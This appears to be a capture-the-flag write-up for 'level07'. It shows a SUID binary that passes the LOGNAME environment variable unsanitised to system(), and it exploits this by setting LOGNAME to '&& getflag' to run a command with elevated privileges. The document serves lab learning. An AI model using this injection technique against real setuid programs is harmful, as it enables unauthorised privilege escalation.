We start by listing the files in the home directory:

```bash
ls
```
Output:
```bash
level07
```

The file is an ELF binary. Checking its permissions:
```bash
ls -la level07
```
Output:
```bash
-rwsr-sr-x 1 flag07 level07 8805 Mar  5  2016 level07
```
The **SUID bit (`s`) is set**, meaning it runs with `flag07` privileges.

Using `ghidra`, we analyze the binary and find that it retrieves the `LOGNAME` environment variable and executes:
```c
asprintf(&local_1c,"/bin/echo %s ",getenv("LOGNAME"));
system(local_1c);
```
Since `system()` directly executes the value of `LOGNAME`, we can **inject commands**.

We set `LOGNAME` to **inject** `getflag`:
```bash
export LOGNAME="&& getflag"
```
Then we run the binary:
```bash
./level07
```

And get the next flag !